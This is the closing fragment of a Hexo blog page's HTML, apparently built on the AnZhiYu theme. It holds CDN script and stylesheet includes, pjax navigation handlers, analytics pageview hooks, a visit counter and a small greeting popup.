</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>